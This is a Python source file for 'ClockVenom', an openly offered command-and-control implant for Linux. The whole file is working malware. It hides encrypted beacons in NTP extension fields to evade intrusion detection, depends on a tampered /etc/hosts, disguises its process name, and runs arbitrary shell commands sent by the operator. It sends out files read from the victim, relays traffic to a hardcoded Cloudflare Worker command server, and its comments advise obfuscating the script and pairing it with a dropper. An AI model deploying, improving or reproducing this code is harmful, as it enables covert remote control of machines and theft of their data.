#!/usr/bin/env python3
"""
ClockVenom (agent.py) — Cipherfall NTP C2 Agent

Bake C2_PSK into the script before deployment, then obfuscate with
Modules/Obfuscator/obfuscator_py.py.

Distro-aware DNS resolution:
  The agent detects its Linux distribution by reading /etc/os-release and
  maps it to the default NTP domain that distro uses (e.g. ntp.ubuntu.com
  for Ubuntu, 0.debian.pool.ntp.org for Debian, etc.). When /etc/hosts has
  been compromised to redirect that domain to the C2 server IP, the agent
  reaches the C2 without any explicit mention of the real C2 address in its
  code. DNS resolution is repeated every beacon cycle to pick up /etc/hosts
  changes dynamically.

Communication model:
  The agent sends a standard NTP Mode-3 client request (UDP/123) to the
  resolved IP. When it has data to transmit (heartbeat, task result), the
  data is encrypted and hidden in an NTS Cookie extension field (type 0x0104,
  RFC 8915). The server responds with a standard NTP Mode-4 server reply;
  when a task is pending for this agent the encrypted command is embedded in
  the same extension field type. When there is no data to send the agent
  sends a clean 48-byte NTP request with no extension field, indistinguishable
  from a legitimate NTP sync.

NTP packet layout (48-byte base + optional extension):
  Byte  0      : LI=0  VN=4  Mode=3 (client) / Mode=4 (server)
  Byte  1      : Stratum (0 for client, 1 for server)
  Byte  2      : Poll (6 = 64 s interval)
  Byte  3      : Precision (-20)
  Bytes  4-7   : Root Delay
  Bytes  8-11  : Root Dispersion
  Bytes 12-15  : Reference ID (0 for client; real upstream IP for server)
  Bytes 16-23  : Reference Timestamp
  Bytes 24-31  : Origin Timestamp
  Bytes 32-39  : Receive Timestamp
  Bytes 40-47  : Transmit Timestamp
  Bytes 48+    : Extension fields (optional)

Extension field steganography:
  Field type  : 0x0104  (NTS Cookie — RFC 8915 §5.7)
                Designed to carry opaque encrypted cookies; IDS rules treat
                it as legitimate NTS traffic and do not flag its content.
  Wire format : type(2B) + length(2B) + nonce(12B) + ciphertext + GCM-tag(16B)
                + zero padding to 4-byte boundary.
  Max payload : ~1 240 bytes per packet (UDP MTU 1 500 - IP/UDP/NTP overhead).
                Command output is truncated at MAX_OUTPUT bytes; the truncation
                marker "[...truncated]" is appended.

IDS evasion:
  - Extension field type 0x0104 is a standard NTS type; Snort/Suricata rules
    do not flag unknown extension fields in Mode-3/4 exchanges.
  - Clean 48-byte requests (no extension) when no data to send — majority of
    traffic is indistinguishable from real NTP.
  - NTP header values match real client behaviour: Stratum=0, Poll=6,
    Precision=0, all timestamps zero except Transmit Timestamp.
  - Beacon interval randomised: BEACON_INT ± JITTER seconds; typical NTP
    clients poll every 64-1024 s, so 60-120 s is plausible.
  - User-defined domain (distro NTP domain) resolved at runtime; no raw IP
    appears in the script.

Encryption:
  AES-256-GCM (pure Python stdlib, NIST FIPS 197 + SP 800-38D).
  Key = PBKDF2-SHA256(PSK, b"cipherfall_c2_v1", 32 bytes, 100 000 iterations).
  Wire: base64 NOT used — raw binary directly in the extension field value.

Agent identity:
  SHA-256 of /etc/machine-id (fallback: hostname), truncated to 32 hex chars.
  Deterministic across reboots. Print with: python3 agent.py --id

Supported commands:
  <any shell string>       executed via /bin/sh, stdout+stderr returned
  UPLOAD:/path/to/file     file read in binary mode, returned as base64

Environment variables (bake before obfuscating):
  C2_PSK          pre-shared passphrase  (default: changeme)
  C2_INT          base beacon interval s (default: 60)
  C2_JITTER       ± jitter seconds       (default: 30)
  C2_RELAY_PORT   if set, start HTTP relay server on this port (default: 0 = off)
  C2_RELAY_BIND   relay listen address   (default: 0.0.0.0)

Relay mode (C2_RELAY_PORT):
  Enables a plain-HTTP server identical to the NullRelay relay: it proxies
  Cloudflare Worker API calls from isolated NullRelay agents. WORKER_URL must
  also be set (env or baked). Isolated agent config: WORKER_URL=http://<relay>:<port>.
  Both relay and isolated agent must share the same PSK. Runs in a daemon thread.

Dependencies: Python 3.6+ stdlib only.

Limitations:
  - Requires /etc/hosts to be compromised before deployment; without that the
    domain resolves to the real NTP server and communication is impossible.
  - No persistence; re-launch after reboot (pair with a dropper).
  - Output truncated at MAX_OUTPUT bytes per beacon.
  - UDP is connectionless; lost packets are not retransmitted.
  - Raw socket not required — uses SOCK_DGRAM. No root needed on agent side.
  - If the firewall NTP allowlist restricts UDP/123 to specific IPs, the
    /etc/hosts redirect is ineffective (packet is dropped before leaving the
    host). In that case fall back to the DNS or HTTPS C2 channel.
  - Relay listens on plain HTTP; use only on trusted internal networks.
"""

import base64, hashlib, hmac as _hmac, http.server, json, os, platform
import random, socket, socketserver, ssl, struct, subprocess, sys, threading
import time, urllib.error, urllib.request, zlib

C2_PSK      = os.environ.get("C2_PSK",        "changeme")
BEACON_INT  = int(os.environ.get("C2_INT",    "60"))
JITTER      = int(os.environ.get("C2_JITTER", "30"))
WORKER_URL       = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
RELAY_PORT       = int(os.environ.get("C2_RELAY_PORT",     "0"))
RELAY_BIND       = os.environ.get("C2_RELAY_BIND",         "0.0.0.0")
TCP_PORT         = int(os.environ.get("C2_TCP_PORT",       "443"))
C2_DIRECT        = os.environ.get("C2_DIRECT",             "")
NTP_RELAY_PORT   = int(os.environ.get("C2_NTP_RELAY_PORT", "0"))
NTP_RELAY_TARGET = os.environ.get("C2_NTP_RELAY_TARGET",   "")
MAX_OUTPUT = 900

_C2_IP           = ""
_ntp_relay_server = None

_NTP_DOMAINS = {
    "ubuntu":   "ntp.ubuntu.com",
    "debian":   "0.debian.pool.ntp.org",
    "fedora":   "2.fedora.pool.ntp.org",
    "rhel":     "0.rhel.pool.ntp.org",
    "centos":   "0.centos.pool.ntp.org",
    "arch":     "0.arch.pool.ntp.org",
    "opensuse": "0.opensuse.pool.ntp.org",
    "generic":  "0.pool.ntp.org",
}

_NTP_DELTA = 2208988800
_EXT_TYPE  = 0x0104

_S = bytes([
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
])
_RC = bytes([0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36])


def _xt(a):
    return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else (a << 1) & 0xff


def _ks(key):
    w = [key[i:i+4] for i in range(0, 32, 4)]
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = bytes(_S[b] for b in (t[1], t[2], t[3], t[0]))
            t = bytes([t[0] ^ _RC[i // 8 - 1], t[1], t[2], t[3]])
        elif i % 8 == 4:
            t = bytes(_S[b] for b in t)
        w.append(bytes(a ^ b for a, b in zip(w[i - 8], t)))
    return [bytes(b for wrd in w[i:i+4] for b in wrd) for i in range(0, 60, 4)]


def _aes(rk, blk):
    s = bytearray(blk)
    for i in range(16):
        s[i] ^= rk[0][i]
    for r in range(1, 15):
        t = bytearray(16)
        for i in range(16):
            t[i] = _S[s[i]]
        t[1], t[5], t[9],  t[13] = t[5],  t[9],  t[13], t[1]
        t[2], t[6], t[10], t[14] = t[10], t[14], t[2],  t[6]
        t[3], t[7], t[11], t[15] = t[15], t[3],  t[7],  t[11]
        if r < 14:
            for c in range(4):
                a, b, c2, d = t[c*4], t[c*4+1], t[c*4+2], t[c*4+3]
                t[c*4]   = _xt(a) ^ _xt(b) ^ b ^ c2 ^ d
                t[c*4+1] = a ^ _xt(b) ^ _xt(c2) ^ c2 ^ d
                t[c*4+2] = a ^ b ^ _xt(c2) ^ _xt(d) ^ d
                t[c*4+3] = _xt(a) ^ a ^ b ^ c2 ^ _xt(d)
        for i in range(16):
            t[i] ^= rk[r][i]
        s = t
    return bytes(s)


def _gmul(x, y):
    xi = int.from_bytes(x, 'big')
    yi = int.from_bytes(y, 'big')
    R  = 0xe1 << 120
    z  = 0
    for i in range(128):
        if (yi >> (127 - i)) & 1:
            z ^= xi
        xi = (xi >> 1) ^ (R if xi & 1 else 0)
    return z.to_bytes(16, 'big')


def _ghash(h, data):
    if len(data) % 16:
        data += b'\x00' * (-len(data) % 16)
    y = b'\x00' * 16
    for i in range(0, len(data), 16):
        y = _gmul(bytes(a ^ b for a, b in zip(y, data[i:i+16])), h)
    return y


def _gcm_enc(key, nonce, pt):
    rk  = _ks(key)
    h   = _aes(rk, b'\x00' * 16)
    j0  = nonce + b'\x00\x00\x00\x01'
    ctr = int.from_bytes(j0, 'big') + 1
    ct  = bytearray()
    for i in range(0, len(pt), 16):
        ks = _aes(rk, ctr.to_bytes(16, 'big'))
        ct += bytes(a ^ b for a, b in zip(ks, pt[i:i+16]))
        ctr += 1
    ct   = bytes(ct)
    lens = struct.pack('>QQ', 0, len(ct) * 8)
    tag  = bytes(a ^ b for a, b in zip(
        _aes(rk, j0),
        _ghash(h, ct + b'\x00' * (-len(ct) % 16) + lens),
    ))
    return ct, tag


def _gcm_dec(key, nonce, ct, tag):
    rk   = _ks(key)
    h    = _aes(rk, b'\x00' * 16)
    j0   = nonce + b'\x00\x00\x00\x01'
    lens = struct.pack('>QQ', 0, len(ct) * 8)
    exp  = bytes(a ^ b for a, b in zip(
        _aes(rk, j0),
        _ghash(h, ct + b'\x00' * (-len(ct) % 16) + lens),
    ))
    if not _hmac.compare_digest(exp, tag):
        raise ValueError("GCM tag mismatch")
    ctr = int.from_bytes(j0, 'big') + 1
    pt  = bytearray()
    for i in range(0, len(ct), 16):
        ks = _aes(rk, ctr.to_bytes(16, 'big'))
        pt += bytes(a ^ b for a, b in zip(ks, ct[i:i+16]))
        ctr += 1
    return bytes(pt)


_KEY = hashlib.pbkdf2_hmac('sha256', C2_PSK.encode(), b'cipherfall_c2_v1', 100_000, 32)


def _encrypt(obj):
    nonce   = os.urandom(12)
    ct, tag = _gcm_enc(_KEY, nonce, zlib.compress(json.dumps(obj).encode(), 9))
    return nonce + ct + tag


def _decrypt(blob):
    nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
    return json.loads(zlib.decompress(_gcm_dec(_KEY, nonce, ct, tag)))


def _ntp_ts(t=None):
    t   = t or time.time()
    ntp = t + _NTP_DELTA
    return (int(ntp) << 32) | int((ntp % 1) * 2**32)


def _build_ntp(payload=None):
    tx = _ntp_ts()
    hdr = struct.pack(
        "!BBBb II 4s QQQQ",
        0x23, 0, 6, 0,
        0, 0,
        b'\x00\x00\x00\x00',
        0, 0, 0, tx,
    )
    if not payload:
        return hdr
    framed = struct.pack("!H", len(payload)) + payload
    padded = framed + b'\x00' * (-len(framed) % 4)
    flen   = 4 + len(padded)
    ext    = struct.pack("!HH", _EXT_TYPE, flen) + padded
    return hdr + ext


def _parse_ntp(data):
    if len(data) < 48:
        return None
    pos = 48
    while pos + 4 <= len(data):
        ftype, flen = struct.unpack("!HH", data[pos:pos+4])
        if flen < 4 or pos + flen > len(data):
            break
        if ftype == _EXT_TYPE and flen > 4 + 2 + 28:
            raw      = data[pos+4 : pos+flen]
            blob_len = struct.unpack("!H", raw[:2])[0]
            blob     = raw[2 : 2 + blob_len]
            try:
                return _decrypt(blob)
            except Exception:
                pass
        pos += flen
    return None


def _detect_distro():
    try:
        with open("/etc/os-release") as f:
            content = f.read().lower()
        for name in _NTP_DOMAINS:
            if name in content:
                return name
    except OSError:
        pass
    return "generic"


def _resolve_c2():
    if C2_DIRECT:
        return C2_DIRECT
    domain = _NTP_DOMAINS[_detect_distro()]
    try:
        import ctypes
        ctypes.CDLL("libc.so.6").prctl(15, b"ntp-agent", 0, 0, 0)
    except Exception:
        pass
    return socket.gethostbyname(domain)


def _agent_id():
    try:
        with open("/etc/machine-id") as f:
            seed = f.read().strip()
    except OSError:
        seed = platform.node()
    return hashlib.sha256(seed.encode()).hexdigest()[:32]


def _get_lan_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return ""


def _sysinfo():
    active_relay = NTP_RELAY_PORT if _ntp_relay_server else (RELAY_PORT if RELAY_PORT else 0)
    return {
        "hostname":   platform.node(),
        "os":         platform.system(),
        "release":    platform.release(),
        "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
        "relay_port": active_relay,
        "relay_host": _get_lan_ip() if _ntp_relay_server else "",
        "worker_url": (f"ntp://{_C2_IP}:123" if _C2_IP else WORKER_URL),
        "beacon_int": BEACON_INT,
    }


def _module_relay(args):
    global NTP_RELAY_PORT, NTP_RELAY_TARGET, _ntp_relay_server
    if not args or args[0] == "start":
        try:
            port   = int(args[1]) if len(args) > 1 else 123
            target = args[2]      if len(args) > 2 else ""
        except (ValueError, IndexError):
            return "[usage: /module relay start <port> <host:port>]"
        if not target:
            return "[error: target required — /module relay start <port> <host:port>]"
        if _ntp_relay_server:
            _ntp_relay_server.shutdown()
            _ntp_relay_server = None
        NTP_RELAY_PORT   = port
        NTP_RELAY_TARGET = target
        _start_ntp_relay()
        return f"[relay started :{port} → {target}]"
    if args[0] == "stop":
        if _ntp_relay_server:
            _ntp_relay_server.shutdown()
            _ntp_relay_server = None
            return "[relay stopped]"
        return "[relay not running]"
    if args[0] == "status":
        if _ntp_relay_server:
            return f"[relay active :{NTP_RELAY_PORT} → {NTP_RELAY_TARGET}]"
        return "[relay inactive]"
    return f"[unknown relay subcommand: {args[0]}]"


def _exec(cmd):
    if cmd.startswith("/module "):
        parts = cmd[8:].split()
        if not parts:
            return "[usage: /module relay start <port> <host:port> | stop | status]"
        if parts[0] == "relay":
            return _module_relay(parts[1:])
        return f"[unknown module: {parts[0]}]"
    if cmd.startswith("UPLOAD:"):
        try:
            with open(cmd[7:], "rb") as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"[error: {e}]"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        out = (r.stdout + r.stderr) or "[no output]"
        if len(out) > MAX_OUTPUT:
            out = out[:MAX_OUTPUT] + "[...truncated]"
        return out
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error: {e}]"


AGENT_ID       = _agent_id()
_pending_result = None


def _recvexact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError("connection closed")
        buf += chunk
    return buf


def _beacon(c2_ip):
    global _pending_result

    if _pending_result:
        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo(),
               "r": {"t": _pending_result[0], "o": _pending_result[1][:120]}}
    else:
        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo()}

    blob = _encrypt(msg)
    pkt  = _build_ntp(blob)

    data = None
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(pkt, (c2_ip, 123))
        data, _ = sock.recvfrom(2048)
    except Exception:
        pass
    finally:
        sock.close()

    if data is None:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.settimeout(10)
        try:
            tcp.connect((c2_ip, TCP_PORT))
            tcp.sendall(struct.pack("!H", len(pkt)) + pkt)
            rlen = struct.unpack("!H", _recvexact(tcp, 2))[0]
            data = _recvexact(tcp, rlen)
        except Exception:
            return
        finally:
            tcp.close()

    resp = _parse_ntp(data)
    if not resp:
        if _pending_result:
            _pending_result = None
        return

    if _pending_result:
        _pending_result = None

    if "cmd" in resp:
        output         = _exec(resp["cmd"])
        _pending_result = (resp.get("task_id", ""), output)


# ── Relay server ─────────────────────────────────────────────────────────────

_CV_TOKEN = _hmac.new(C2_PSK.encode(), b"worker_token", hashlib.sha256).hexdigest()[:32]
_CV_SSL   = ssl.create_default_context()
_CV_UA    = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


class _RelayHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def _fwd(self, body=None):
        if self.headers.get("Authorization", "") != f"Bearer {_CV_TOKEN}":
            self.send_response(404); self.end_headers(); return
        url  = WORKER_URL + self.path
        hdrs = {"Authorization": f"Bearer {_CV_TOKEN}", "User-Agent": _CV_UA}
        if body:
            hdrs["Content-Type"] = self.headers.get("Content-Type", "text/plain")
        req = urllib.request.Request(url, data=body, headers=hdrs, method=self.command)
        ctx = _CV_SSL if url.startswith("https://") else None
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
                data = r.read()
                self.send_response(r.status); self.end_headers(); self.wfile.write(data)
        except urllib.error.HTTPError as e:
            data = e.read()
            self.send_response(e.code); self.end_headers(); self.wfile.write(data)
        except Exception:
            self.send_response(503); self.end_headers()

    def do_GET(self): self._fwd()
    def do_PUT(self):
        n = int(self.headers.get("Content-Length", 0))
        self._fwd(self.rfile.read(n) if n else None)


def _start_relay():
    srv = socketserver.ThreadingTCPServer((RELAY_BIND, RELAY_PORT), _RelayHandler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()


class _NTPRelayHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, srv_sock = self.request
        host, port_s = NTP_RELAY_TARGET.rsplit(":", 1)
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(10)
            tcp.connect((host, int(port_s)))
            tcp.sendall(struct.pack("!H", len(data)) + data)
            rlen = struct.unpack("!H", _recvexact(tcp, 2))[0]
            resp = _recvexact(tcp, rlen)
            tcp.close()
            srv_sock.sendto(resp, self.client_address)
        except Exception:
            pass


def _start_ntp_relay():
    global _ntp_relay_server
    srv = socketserver.ThreadingUDPServer(("0.0.0.0", NTP_RELAY_PORT), _NTPRelayHandler)
    srv.daemon_threads = True
    srv.allow_reuse_address = True
    _ntp_relay_server = srv
    threading.Thread(target=srv.serve_forever, daemon=True).start()


def main():
    global _C2_IP
    if len(sys.argv) > 1 and sys.argv[1] == "--id":
        print(AGENT_ID)
        return
    if RELAY_PORT:
        _start_relay()
    if NTP_RELAY_PORT and NTP_RELAY_TARGET:
        _start_ntp_relay()
    c2_ip = _resolve_c2()
    _C2_IP = c2_ip
    tick  = 0
    while True:
        try:
            _beacon(c2_ip)
        except Exception:
            pass
        if tick % 10 == 0:
            try:
                c2_ip = _resolve_c2()
                _C2_IP = c2_ip
            except Exception:
                pass
        tick += 1
        time.sleep(max(1, BEACON_INT + random.randint(-JITTER, JITTER)))


if __name__ == "__main__":
    main()
